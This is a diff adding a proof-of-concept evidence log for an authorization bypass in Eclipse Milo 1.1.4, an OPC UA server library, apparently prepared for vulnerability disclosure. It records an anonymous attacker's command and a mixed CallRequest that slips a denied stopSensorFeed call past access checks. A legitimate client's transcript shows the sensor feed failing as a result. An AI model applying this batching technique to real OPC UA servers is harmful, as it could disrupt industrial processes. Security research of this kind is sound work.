@@ -1,0 +1,51 @@
+# the mixed-batch bypass evidence -- captured_at_utc=2026-07-28T11:59:52Z
+# label=row6r-attack-victim-disrupted-reversed-vulnerable-1.1.4.log :: Row 6r: THE LIVE ATTACK, REVERSED ORDER -- anonymous attacker's mixed CallRequest [stopSensorFeed, readStatus] against vulnerable Milo 1.1.4 -- proves the live-victim disruption is order-independent, same as Row 3r
+# environment: see /Users/abhinavagarwal/Documents/work/milo-security-poc/call-mixed-batch-authz-bypass/evidence/environment.log for exact dependency versions, artifact
+#              hashes, JDK/Maven/OS info shared by this entire run
+# ------------------------------------------------------------------
+$ java -cp /tmp/call-batch-poc-vuln-63183.jar callbatch.Attacker opc.tcp://localhost:18723/milo mixed-batch-stopfeed-rev
+
+CLIENT phase=mixed-batch-stopfeed-rev url=opc.tcp://localhost:18723/milo identity=anonymous
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Java version: 17.0.19
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Stack version: dev
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Client SDK version: dev
+CLIENT connected (anonymous, SecurityPolicy.None)
+CLIENT discovered nodes via Browse: Device=NodeId{ns=3, id=Plant/Device} readStatus=NodeId{ns=3, id=Plant/Device/readStatus} resetDevice=NodeId{ns=3, id=Plant/Device/resetDevice} SensorFeed=NodeId{ns=3, id=Plant/SensorFeed} stopSensorFeed=NodeId{ns=3, id=Plant/SensorFeed/stopSensorFeed}
+ATTACK (mixed batch, SensorFeed, REVERSED order): anonymous attacker sends ONE CallRequest [stopSensorFeed (DENIED), readStatus (allowed)]
+CLIENT batch call completed exceptionally -- WIRE RESULT: UaException: status=Bad_Timeout, message=UaException: status=Bad_Timeout, message=requestId=17 timed out after 5000ms
+CLIENT_DONE phase=mixed-batch-stopfeed-rev
+
+server-side counters (ground truth): readStatus=1 resetDevice=0 deviceReset=false stopSensorFeed=1 feedRunning=false
+LegitClient baseline (pre-attack) : goodTicks=14 badTicks=0
+LegitClient final    (post-attack): goodTicks=18 badTicks=1
+
+NOTE ON THE WIRE: reported exactly as observed above. The LegitClient transcript below,
+captured by a wholly separate JVM process with its own OPC UA session, is the
+independent, third-party evidence of what actually happened server-side.
+
+--- LegitClient (separate process) full transcript ---
+LEGIT_CLIENT starting url=opc.tcp://localhost:18723/milo durationSeconds=18 identity=anonymous (independent third victim session)
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Java version: 17.0.19
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Stack version: dev
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Client SDK version: dev
+LEGIT_CLIENT connected (anonymous, SecurityPolicy.None)
+LEGIT_CLIENT discovered Plant/SensorFeed/Value=NodeId{ns=3, id=Plant/SensorFeed/Value}
+LEGIT_TICK ts=1785240086609 value=24.388509276451067 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=1 badTicks=0
+LEGIT_TICK ts=1785240086807 value=24.60870322641721 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=2 badTicks=0
+LEGIT_TICK ts=1785240087008 value=24.77852403347724 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=3 badTicks=0
+LEGIT_TICK ts=1785240087220 value=24.900580034900635 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=4 badTicks=0
+LEGIT_TICK ts=1785240087419 value=24.975393278037526 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=5 badTicks=0
+LEGIT_TICK ts=1785240087622 value=24.999992353436053 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=6 badTicks=0
+LEGIT_TICK ts=1785240087827 value=24.97414021659838 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=7 badTicks=0
+LEGIT_TICK ts=1785240088035 value=24.900582216526864 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=8 badTicks=0
+LEGIT_TICK ts=1785240088239 value=24.775574504610752 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=9 badTicks=0
+LEGIT_TICK ts=1785240088440 value=24.598954809733534 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=10 badTicks=0
+LEGIT_TICK ts=1785240088652 value=24.382510921814944 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=11 badTicks=0
+LEGIT_TICK ts=1785240088857 value=24.121734202551472 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=12 badTicks=0
+LEGIT_TICK ts=1785240089062 value=23.482640495702867 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=13 badTicks=0
+LEGIT_TICK ts=1785240089265 value=23.10511563967375 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=14 badTicks=0
+LEGIT_TICK ts=1785240089470 value=22.69625473562134 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=15 badTicks=0
+LEGIT_TICK ts=1785240089675 value=22.260183905214202 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=16 badTicks=0
+LEGIT_TICK ts=1785240089881 value=21.803635600703476 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=17 badTicks=0
+LEGIT_TICK ts=1785240090086 value=21.331476251915756 statusCode=StatusCode[name=Good, value=0x00000000, quality=good] goodTicks=18 badTicks=0
+LEGIT_TICK ts=1785240090291 value=null statusCode=StatusCode[name=Bad_NoCommunication, value=0x80310000, quality=bad] goodTicks=18 badTicks=1
